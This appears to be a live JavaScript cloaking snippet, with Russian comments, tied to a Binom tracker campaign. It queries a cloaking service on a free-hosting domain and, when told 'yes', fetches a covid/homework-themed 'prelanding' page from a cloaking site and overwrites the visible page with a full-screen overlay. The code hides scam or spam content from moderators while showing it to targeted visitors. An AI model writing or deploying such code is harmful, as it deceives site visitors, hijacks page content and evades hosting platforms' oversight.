var binomCampaingKey = 'qg15f8wf5z6hjqlp36rd'; /*Netlify _Essay id:371. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
var landingUrl = 'https://endemic-tours.000webhostapp.com/public_html/frame.php?link=https://cloaking.site/landing/homework/covid_2_frame/?flowtag=12520'; /*Адрес преленда, который необходимо подгрузить*/

var landing = landingUrl;
/* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/

var url = 'https://endemic-tours.000webhostapp.com/binom/?bckey='+binomCampaingKey;
var xhr = new XMLHttpRequest();
var cloakResult = 'no';
var b = document.querySelector("mwrap"); 

xhr.open('GET', url, false);
xhr.send();

if (xhr.status == 200) {
  cloakResult = xhr.responseText;
} 

if(cloakResult=="yes"){
var xhrLand = new XMLHttpRequest();
var landingCode = '';

xhrLand.open('GET', landing, false);
xhrLand.send();

if (xhrLand.status == 200) {
  document.write("<style>#mwrap{z-index: 2147483647;background:white !important;width: 100vw !important;height: 100vh !important;border: 0px !important;position: fixed;top: 0;left: 0;}</style>")
  landingCode = xhrLand.responseText;
}

document.write(landingCode);

}